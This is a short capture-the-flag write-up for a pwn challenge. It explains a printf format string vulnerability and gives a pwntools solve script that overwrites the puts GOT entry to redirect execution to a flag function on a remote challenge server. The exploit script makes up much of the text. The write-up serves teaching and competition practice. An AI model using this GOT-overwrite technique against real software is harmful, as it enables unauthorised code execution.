# Not Really AI
A pwn challenge. Just a simple format string exploit.

Protections: Partial RELRO, no PIE, therefore we can overwrite the GOT as it is not read-only.

When our input is asked for, it is printed out using printf without proper format strings.

Our input is put on the stack, so the program is vulnerable to arbtirary writes via `%n`.

There's no buffer overflow, and only one input, so we shouldn't be leaking anything.

We can send a simple format string overwrite payload to rewrite puts@GOT with the address of the function flaggy, and the flag will be yours.\
This works as puts@plt is called just after printf is called on our input, so we can overwrite the GOT entry with a different value.

Thus when the plt is called it will find a different GOT value and jump to that.

Here is the solve script:
```python
from pwn import *
e = ELF("./nra")
def getproc():
    return remote('95.216.233.106',43941)
    #return e.process()
def write_fmt(string):
    p = getproc()
    p.sendline(string)
    p.recvline()
    out = p.recv()
    p.close()
    return out
auto = FmtStr(execute_fmt=write_fmt)
writes = {e.got['puts']: e.sym['flaggy']}
payload = fmtstr.fmtstr_payload(auto.offset, writes)
p = getproc()
p.sendline(payload)
p.interactive()
```
